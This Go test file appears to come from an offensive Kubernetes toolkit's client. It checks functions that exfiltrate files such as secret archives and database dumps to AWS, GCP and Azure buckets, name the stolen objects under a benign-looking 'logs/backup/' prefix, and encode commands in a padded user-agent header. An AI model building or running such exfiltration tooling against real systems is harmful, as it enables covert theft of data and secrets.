package cloud_exfil

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

func TestExfilResultJSON(t *testing.T) {
	result := &ExfilResult{
		Provider:  "aws",
		Bucket:    "my-bucket",
		ObjectKey: "logs/backup/data-abc123.tar.gz",
		FileSize:  1048576,
		Status:    "uploaded",
		Detail:    "S3 PutObject",
	}

	data, err := json.Marshal(result)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	var decoded ExfilResult
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if decoded.Provider != "aws" {
		t.Errorf("provider = %q, want aws", decoded.Provider)
	}
	if decoded.Bucket != "my-bucket" {
		t.Errorf("bucket = %q", decoded.Bucket)
	}
	if decoded.FileSize != 1048576 {
		t.Errorf("file_size = %d", decoded.FileSize)
	}
}

func TestExecuteInvalidProvider(t *testing.T) {
	err := Execute("http://localhost:8000", "invalid", "bucket", "/tmp/file", "meta", "")
	if err == nil {
		t.Fatal("expected error for invalid provider")
	}
}

func TestExfilAWSStructure(t *testing.T) {
	result := exfilAWS("http://unreachable:9999", "test-bucket", "/tmp/secret.tar.gz", "meta")
	if result.Provider != "aws" {
		t.Errorf("provider = %q, want aws", result.Provider)
	}
	if result.Bucket != "test-bucket" {
		t.Errorf("bucket = %q", result.Bucket)
	}
	if !strings.HasPrefix(result.ObjectKey, "logs/backup/") {
		t.Errorf("object_key = %q, want logs/backup/ prefix", result.ObjectKey)
	}
}

func TestExfilGCPStructure(t *testing.T) {
	result := exfilGCP("http://unreachable:9999", "gcs-bucket", "/tmp/data.json", "meta")
	if result.Provider != "gcp" {
		t.Errorf("provider = %q, want gcp", result.Provider)
	}
}

func TestExfilAzureStructure(t *testing.T) {
	result := exfilAzure("http://unreachable:9999", "azure-container", "/tmp/db.sql", "manual")
	if result.Provider != "azure" {
		t.Errorf("provider = %q, want azure", result.Provider)
	}
}

func TestGenerateObjectKey(t *testing.T) {
	key := generateObjectKey("/var/lib/data/secrets.tar.gz")
	if !strings.HasPrefix(key, "logs/backup/secrets-") {
		t.Errorf("key = %q, want logs/backup/secrets- prefix", key)
	}
	if !strings.HasSuffix(key, ".tar.gz") {
		t.Errorf("key = %q, want .tar.gz suffix", key)
	}
}

func TestBuildExfilUserAgentPadding(t *testing.T) {
	ua := buildExfilUserAgent("exfil_s3#bucket#key#file#meta")
	if len(ua) != model.UserAgentPaddingLen {
		t.Errorf("len = %d, want %d", len(ua), model.UserAgentPaddingLen)
	}
}
